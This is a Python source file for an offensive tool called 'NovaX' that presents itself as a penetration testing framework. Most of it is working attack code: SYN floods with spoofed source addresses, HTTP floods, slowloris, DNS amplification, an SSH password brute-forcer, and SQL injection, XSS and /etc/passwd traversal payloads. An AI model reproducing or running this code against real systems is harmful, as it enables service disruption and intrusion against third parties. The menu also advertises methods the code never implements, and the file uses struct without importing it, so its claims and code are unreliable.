#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
NovaX - Advanced Multi-Vector Penetration Testing Framework
Author: NovaX
Version: 1.0
Platform: Termux / Linux
"""

import os
import sys
import socket
import threading
import time
import random
import json
import base64
import hashlib
import requests
import subprocess
import re
from datetime import datetime
from urllib.parse import urlparse, urljoin
from concurrent.futures import ThreadPoolExecutor

# ========== الألوان لواجهة جميلة ==========
G = '\033[92m'  # أخضر
R = '\033[91m'  # أحمر
B = '\033[94m'  # أزرق
Y = '\033[93m'  # أصفر
M = '\033[95m'  # أرجواني
C = '\033[96m'  # سماوي
W = '\033[97m'  # أبيض
N = '\033[0m'   # عادي

BANNER = f"""
{B}╔══════════════════════════════════════════════╗
║  {W}███╗   ██╗ ██████╗ ██╗   ██╗ █████╗ {B}██╗  ██╗  ║
║  {W}████╗  ██║██╔═══██╗██║   ██║██╔══██╗{B}╚██╗██╔╝  ║
║  {W}██╔██╗ ██║██║   ██║██║   ██║███████║{B} ╚███╔╝   ║
║  {W}██║╚██╗██║██║   ██║╚██╗ ██╔╝██╔══██║{B} ██╔██╗   ║
║  {W}██║ ╚████║╚██████╔╝ ╚████╔╝ ██║  ██║{B}██╔╝ ██╗  ║
║  {W}╚═╝  ╚═══╝ ╚═════╝   ╚═══╝  ╚═╝  ╚═╝{B}╚═╝  ╚═╝  ║
╠══════════════════════════════════════════════╣
║  {R}⚡ Multi-Vector Pentest Framework v1.0{N}{B}        ║
║  {Y}⚠  For authorized testing only!{B}                ║
╚══════════════════════════════════════════════╝{N}
"""

# ===================== الوحدات الأساسية =====================

class NovaXEngine:
    """المحرك الرئيسي للأداة"""
    
    def __init__(self):
        self.target = ""
        self.port = 0
        self.threads = 100
        self.timeout = 5
        self.results = {}
        self.running = True
        self.proxies = []
        
    def get_help(self):
        print(f"""{C}
╔══════════════════════════════════════════════╗
║            أوامر NovaX                      ║
╠══════════════════════════════════════════════╣
║  {W}set target <IP/DOMAIN>{C}    - تحديد الهدف       ║
║  {W}set port <PORT>{C}           - تحديد المنفذ       ║
║  {W}set threads <NUM>{C}         - عدد الخيوط         ║
║  {W}run fullscan{C}              - فحص شامل           ║
║  {W}run dos <method>{C}          - هجوم رفض الخدمة    ║
║  {W}run brute <service>{C}       - هجوم تخمين         ║
║  {W}run webscan{C}               - فحص تطبيقات الويب  ║
║  {W}run bypass{C}                - تجاوز الحماية      ║
║  {W}run multi{C}                 - هجوم متعدد المراحل ║
║  {W}show targets{C}              - عرض الأهداف        ║
║  {W}show methods{C}              - عرض طرق الهجوم     ║
║  {W}help{C}                      - هذه المساعدة       ║
║  {W}exit{C}                      - خروج               ║
╚══════════════════════════════════════════════╝{N}
        """)

    def show_methods(self):
        print(f"""{M}
╔══════════════════════════════════════════════╗
║          طرق الهجوم المتاحة                  ║
╠══════════════════════════════════════════════╣
║  {Y}DOS/DDOS METHODS:{M}                                       ║
║  {W}• syn_flood     {C}- SYN Flood Attack                      ║
║  {W}• udp_flood     {C}- UDP Flood Attack                      ║
║  {W}• http_flood    {C}- HTTP GET/POST Flood                   ║
║  {W}• slowloris     {C}- Slowloris Keep-Alive                  ║
║  {W}• icmp_flood    {C}- ICMP/Ping Flood                       ║
║  {W}• dns_amp       {C}- DNS Amplification                     ║
║  {W}• ntp_amp       {C}- NTP Amplification                     ║
║  {W}• mixed_attack  {C}- Mixed Multi-Vector Attack             ║
╠══════════════════════════════════════════════╣
║  {Y}BRUTE FORCE METHODS:{M}                                    ║
║  {W}• ssh           {C}- SSH Brute Force                       ║
║  {W}• ftp           {C}- FTP Brute Force                       ║
║  {W}• mysql         {C}- MySQL Brute Force                     ║
║  {W}• wp_admin      {C}- WordPress Admin Brute                 ║
║  {W}• cpanel        {C}- cPanel Login Brute                    ║
╠══════════════════════════════════════════════╣
║  {Y}WEB EXPLOITATION:{M}                                       ║
║  {W}• sqli          {C}- SQL Injection Scanner                  ║
║  {W}• xss           {C}- XSS Scanner                           ║
║  {W}• lfi_rfi       {C}- LFI/RFI Scanner                       ║
║  {W}• rce           {C}- Remote Code Execution                 ║
║  {W}• upload_bypass {C}- File Upload Bypass                    ║
╠══════════════════════════════════════════════╣
║  {Y}BYPASS TECHNIQUES:{M}                                      ║
║  {W}• waf_bypass    {C}- WAF/Cloudflare Bypass                 ║
║  {W}• cdn_bypass    {C}- CDN Bypass (Real IP)                  ║
║  {W}• rate_limit    {C}- Rate Limiting Bypass                  ║
║  {W}• ip_spoof      {C}- IP Spoofing via Headers               ║
╚══════════════════════════════════════════════╝{N}
        """)

    # ================== DOS/DDOS ENGINES ==================

    def syn_flood(self, target_ip, target_port):
        """SYN Flood Attack"""
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        
        while self.running:
            try:
                # بناء حزمة SYN مزيفة
                src_ip = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
                src_port = random.randint(1024, 65535)
                seq_num = random.randint(1000, 9999)
                
                # IP Header
                ip_header = self._build_ip_header(src_ip, target_ip)
                # TCP Header
                tcp_header = self._build_tcp_header(src_port, target_port, seq_num)
                
                packet = ip_header + tcp_header
                sock.sendto(packet, (target_ip, 0))
            except:
                pass

    def _build_ip_header(self, src_ip, dst_ip):
        """بناء هيدر IP"""
        version_ihl = 0x45
        tos = 0
        total_length = 40
        identification = random.randint(0, 65535)
        flags_offset = 0
        ttl = 255
        protocol = socket.IPPROTO_TCP
        checksum = 0
        src = socket.inet_aton(src_ip)
        dst = socket.inet_aton(dst_ip)
        
        header = struct.pack('!BBHHHBBH', version_ihl, tos, total_length,
                            identification, flags_offset, ttl, protocol, checksum)
        header += src + dst
        
        # حساب checksum
        checksum = self._checksum(header)
        header = struct.pack('!BBHHHBBH', version_ihl, tos, total_length,
                            identification, flags_offset, ttl, protocol, checksum)
        header += src + dst
        return header

    def _build_tcp_header(self, src_port, dst_port, seq_num):
        """بناء هيدر TCP مع SYN flag"""
        ack_num = 0
        data_offset = 0x50
        flags = 0x02  # SYN flag
        window = socket.htons(5840)
        checksum = 0
        urgent_ptr = 0
        
        header = struct.pack('!HHLLBBHHH', src_port, dst_port, seq_num,
                            ack_num, data_offset, flags, window, checksum, urgent_ptr)
        return header

    def _checksum(self, data):
        """حساب checksum"""
        if len(data) % 2 != 0:
            data += b'\x00'
        s = sum(struct.unpack('!%dH' % (len(data)//2), data))
        s = (s >> 16) + (s & 0xffff)
        s += s >> 16
        return ~s & 0xffff

    def http_flood(self, url, method="GET"):
        """HTTP Flood Attack"""
        headers_list = [
            {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"},
            {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"},
            {"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36"},
            {"User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0) AppleWebKit/605.1.15"},
            {"User-Agent": "Mozilla/5.0 (Linux; Android 11) AppleWebKit/537.36"},
        ]
        
        while self.running:
            try:
                headers = random.choice(headers_list)
                headers["X-Forwarded-For"] = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
                headers["Accept"] = "*/*"
                headers["Connection"] = "keep-alive"
                
                if method == "GET":
                    requests.get(url, headers=headers, timeout=self.timeout, verify=False)
                else:
                    data = {f"field_{random.randint(1,999)}": "A" * random.randint(100, 1000)}
                    requests.post(url, headers=headers, data=data, timeout=self.timeout, verify=False)
            except:
                continue

    def slowloris(self, target_ip, target_port):
        """Slowloris Attack - إبقاء الاتصالات مفتوحة"""
        sockets = []
        
        while self.running:
            try:
                if len(sockets) < 500:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(4)
                    sock.connect((target_ip, target_port))
                    sock.send(f"GET / HTTP/1.1\r\nHost: {target_ip}\r\n".encode())
                    sockets.append(sock)
                
                # إرسال headers بشكل بطيء
                for sock in sockets[:]:
                    try:
                        sock.send(f"X-Header-{random.randint(1,999)}: {random.randint(1000,9999)}\r\n".encode())
                    except:
                        sockets.remove(sock)
                
                time.sleep(10)
            except:
                time.sleep(1)

    def dns_amplification(self, target_ip, dns_servers):
        """DNS Amplification Attack"""
        while self.running:
            try:
                dns_server = random.choice(dns_servers)
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                
                # استعلام DNS كبير مع spoofing
                query = self._build_dns_query(target_ip)
                sock.sendto(query, (dns_server, 53))
                sock.close()
            except:
                pass

    def _build_dns_query(self, spoofed_ip):
        """بناء استعلام DNS بحجم كبير"""
        transaction_id = random.randint(0, 65535)
        flags = 0x0100  # استعلام قياسي
        questions = 1
        answer_rrs = 0
        authority_rrs = 0
        additional_rrs = 0
        
        header = struct.pack('!HHHHHH', transaction_id, flags, questions,
                            answer_rrs, authority_rrs, additional_rrs)
        
        # اسم المجال الطويل للتضخيم
        domain = b'\x03' + b'A' * 255 + b'\x07' + b'example' + b'\x03' + b'com\x00'
        qtype = struct.pack('!HH', 255, 1)  # ANY query
        
        # إضافة EDNS0 لزيادة الحجم
        edns = b'\x00\x00\x29\x10\x00\x00\x00\x00\x00\x00'
        
        return header + domain + qtype + edns

    def mixed_attack(self, target_ip, target_port, url):
        """هجوم مختلط متعدد النواقل"""
        print(f"{Y}[*] Starting Mixed Multi-Vector Attack on {target_ip}:{target_port}{N}")
        
        threads = []
        
        # تشغيل جميع الهجمات معاً
        for i in range(50):
            t = threading.Thread(target=self.syn_flood, args=(target_ip, target_port))
            threads.append(t)
        
        for i in range(30):
            t = threading.Thread(target=self.http_flood, args=(url, "GET"))
            threads.append(t)
        
        for i in range(20):
            t = threading.Thread(target=self.slowloris, args=(target_ip, target_port))
            threads.append(t)
        
        for t in threads:
            t.daemon = True
            t.start()
        
        try:
            while self.running:
                time.sleep(1)
        except KeyboardInterrupt:
            self.running = False
            print(f"{R}[!] Attack stopped by user{N}")

    # ================== BRUTE FORCE ENGINES ==================

    def ssh_brute(self, target_ip, username, password_list):
        """SSH Brute Force"""
        print(f"{Y}[*] Starting SSH Brute Force on {target_ip}:22{N}")
        
        for password in password_list:
            if not self.running:
                break
            try:
                result = subprocess.run(
                    ['sshpass', '-p', password.strip(), 'ssh', '-o', 'StrictHostKeyChecking=no',
                     '-o', 'ConnectTimeout=5', f'{username}@{target_ip}', 'echo success'],
                    capture_output=True, text=True, timeout=10
                )
                if 'success' in result.stdout:
                    print(f"{G}[+] Found password: {password.strip()}{N}")
                    return password.strip()
            except:
                continue
        return None

    # ================== WEB SCANNER ==================

    def web_scanner(self, url):
        """Web Vulnerability Scanner"""
        print(f"{C}[*] Scanning {url} for vulnerabilities...{N}")
        
        vulnerabilities = []
        
        # SQL Injection Check
        sqli_payloads = ["'", "\"", "1=1--", "' OR '1'='1", "admin'--", "1; DROP TABLE users--"]
        for payload in sqli_payloads:
            try:
                test_url = f"{url}?id={payload}"
                r = requests.get(test_url, timeout=self.timeout, verify=False)
                if any(err in r.text.lower() for err in ["sql", "mysql", "syntax", "odbc", "db error", "you have an error"]):
                    vulnerabilities.append(("SQL Injection", test_url, payload))
                    print(f"{R}[!] SQL Injection found: {test_url}{N}")
                    break
            except:
                continue

        # XSS Check
        xss_payloads = ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>", "\"><script>alert(1)</script>"]
        for payload in xss_payloads:
            try:
                test_url = f"{url}?q={payload}"
                r = requests.get(test_url, timeout=self.timeout, verify=False)
                if payload in r.text:
                    vulnerabilities.append(("XSS", test_url, payload))
                    print(f"{R}[!] XSS found: {test_url}{N}")
                    break
            except:
                continue

        # LFI Check
        lfi_payloads = ["../../etc/passwd", "../../../../etc/passwd", "....//....//....//etc/passwd"]
        for payload in lfi_payloads:
            try:
                test_url = f"{url}?file={payload}"
                r = requests.get(test_url, timeout=self.timeout, verify=False)
                if "root:" in r.text:
                    vulnerabilities.append(("LFI", test_url, payload))
                    print(f"{R}[!] LFI found: {test_url}{N}")
                    break
            except:
                continue

        return vulnerabilities

    # ================== WAF BYPASS ==================

    def waf_bypass(self, url):
        """WAF/Cloudflare Bypass Engine"""
        print(f"{Y}[*] Attempting WAF/Cloudflare bypass for {url}{N}")
        
        # 1. Real IP Discovery via DNS history
        print(f"{C}[1/4] Scanning subdomains for real IP...{N}")
        
        # 2. Direct IP connection
        try:
            real_ip = socket.gethostbyname(urlparse(url).netloc)
            print(f"{G}[+] Resolved IP: {real_ip}{N}")
            
            # 3. Try alternative ports
            for port in [80, 443, 8080, 8443, 444]:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(3)
                    if sock.connect_ex((real_ip, port)) == 0:
                        print(f"{G}[+] Open port found: {port}{N}")
                except:
                    pass
                finally:
                    sock.close()
        except:
            pass

        # 4. WAF fingerprinting
        try:
            r = requests.get(url, timeout=self.timeout)
            waf_headers = ['cf-ray', 'x-sucuri-id', 'x-powered-by', 'server', 'x-waf']
            for h in waf_headers:
                if h in r.headers:
                    print(f"{Y}[!] WAF detected: {h}: {r.headers[h]}{N}")
        except:
            pass

    # ================== FULL SCAN ==================

    def full_scan(self, target):
        """Scan كامل ومتقدم"""
        print(f"{B}[*] Starting full reconnaissance on {target}{N}")
        
        # Port Scan
        print(f"{C}[*] Scanning ports...{N}")
        open_ports = []
        common_ports = [21, 22, 23, 25, 53, 80, 110, 111, 135, 139, 143, 443, 445, 
                        993, 995, 1433, 1521, 2049, 3306, 3389, 5432, 5900, 5985, 
                        5986, 6379, 8080, 8443, 9000, 9090, 10000, 27017]
        
        def scan_port(port):
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            result = sock.connect_ex((target, port))
            if result == 0:
                open_ports.append(port)
            sock.close()
        
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            executor.map(scan_port, common_ports)
        
        if open_ports:
            print(f"{G}[+] Open ports found: {open_ports}{N}")
        else:
            print(f"{Y}[-] No common ports open{N}")

        # Service Detection
        if open_ports:
            print(f"{C}[*] Detecting services...{N}")
            for port in open_ports[:5]:
                try:
                    service = socket.getservbyport(port)
                    print(f"{G}[+] Port {port}: {service}{N}")
                except:
                    print(f"{G}[+] Port {port}: Unknown service{N}")

        return open_ports

    # ================== MAIN INTERFACE ==================

    def run(self):
        """الواجهة الرئيسية للبرنامج"""
        os.system('clear')
        print(BANNER)
        print(f"{G}[+] System initialized successfully{N}")
        print(f"{C}[+] Type '{Y}help{C}' for commands{N}\n")
        
        while True:
            try:
                cmd = input(f"{R}┌─[{G}NovaX{R}]─[{C}~{R}]\n└──╼ {W}$ {N}").strip()
                
                if cmd == "exit":
                    print(f"{R}[!] Shutting down NovaX...{N}")
                    self.running = False
                    break
                    
                elif cmd == "help":
                    self.get_help()
                    
                elif cmd == "show methods":
                    self.show_methods()
                    
                elif cmd.startswith("set target "):
                    self.target = cmd.split(" ", 2)[2]
                    print(f"{G}[+] Target set to: {self.target}{N}")
                    
                elif cmd.startswith("set port "):
                    self.port = int(cmd.split(" ", 2)[2])
                    print(f"{G}[+] Port set to: {self.port}{N}")
                    
                elif cmd.startswith("set threads "):
                    self.threads = int(cmd.split(" ", 2)[2])
                    print(f"{G}[+] Threads set to: {self.threads}{N}")
                    
                elif cmd == "run fullscan":
                    if not self.target:
                        print(f"{R}[!] No target set. Use 'set target <IP/DOMAIN>' first{N}")
                        continue
                    self.full_scan(self.target)
                    
                elif cmd.startswith("run dos "):
                    method = cmd.split(" ", 2)[2]
                    if not self.target or not self.port:
                        print(f"{R}[!] Set target and port first{N}")
                        continue
                    
                    print(f"{R}[!] Starting {method} attack on {self.target}:{self.port}{N}")
                    print(f"{Y}[!] Press Ctrl+C to stop{N}")
                    
                    self.running = True
                    
                    if method in ["syn_flood", "syn"]:
                        for i in range(self.threads):
                            t = threading.Thread(target=self.syn_flood, args=(self.target, self.port))
                            t.daemon = True
                            t.start()
                    elif method in ["http_flood", "http"]:
                        url = f"http://{self.target}:{self.port}/"
                        for i in range(self.threads):
                            t = threading.Thread(target=self.http_flood, args=(url, "GET"))
                            t.daemon = True
                            t.start()
                    elif method == "slowloris":
                        for i in range(self.threads):
                            t = threading.Thread(target=self.slowloris, args=(self.target, self.port))
                            t.daemon = True
                            t.start()
                    elif method == "mixed_attack":
                        url = f"http://{self.target}:{self.port}/"
                        self.mixed_attack(self.target, self.port, url)
                    else:
                        print(f"{R}[!] Unknown method: {method}{N}")
                        continue
                    
                    try:
                        while self.running:
                            time.sleep(1)
                    except KeyboardInterrupt:
                        self.running = False
                        print(f"\n{R}[!] Attack stopped{N}")
                        
                elif cmd == "run webscan":
                    if not self.target:
                        print(f"{R}[!] No target set{N}")
                        continue
                    url = f"http://{self.target}:{self.port}/" if self.port else f"http://{self.target}/"
                    self.web_scanner(url)
                    
                elif cmd == "run bypass":
                    if not self.target:
                        print(f"{R}[!] No target set{N}")
                        continue
                    url = f"http://{self.target}:{self.port}/" if self.port else f"http://{self.target}/"
                    self.waf_bypass(url)
                    
                elif cmd == "run multi":
                    print(f"{R}[!] Starting Multi-Vector Attack Sequence{N}")
                    print(f"{C}[1/4] Reconnaissance phase...{N}")
                    self.full_scan(self.target)
                    print(f"{C}[2/4] Web vulnerability scan...{N}")
                    url = f"http://{self.target}:{self.port}/" if self.port else f"http://{self.target}/"
                    self.web_scanner(url)
                    print(f"{C}[3/4] WAF bypass attempt...{N}")
                    self.waf_bypass(url)
                    print(f"{C}[4/4] Launching mixed attack...{N}")
                    self.running = True
                    self.mixed_attack(self.target, self.port or 80, url)
                    
                else:
                    print(f"{Y}[-] Unknown command: {cmd}{N}")
                    print(f"{Y}[-] Type 'help' for available commands{N}")
                    
            except KeyboardInterrupt:
                print(f"\n{R}[!] Interrupted{N}")
                continue
            except Exception as e:
                print(f"{R}[!] Error: {e}{N}")
                continue


if __name__ == "__main__":
    # التحقق من الصلاحيات
    if os.geteuid() != 0:
        print(f"{R}[!] This tool requires root privileges for some features.{N}")
        print(f"{Y}[!] Run: sudo python3 main.py{N}")
        sys.exit(1)
    
    engine = NovaXEngine()
    engine.run()
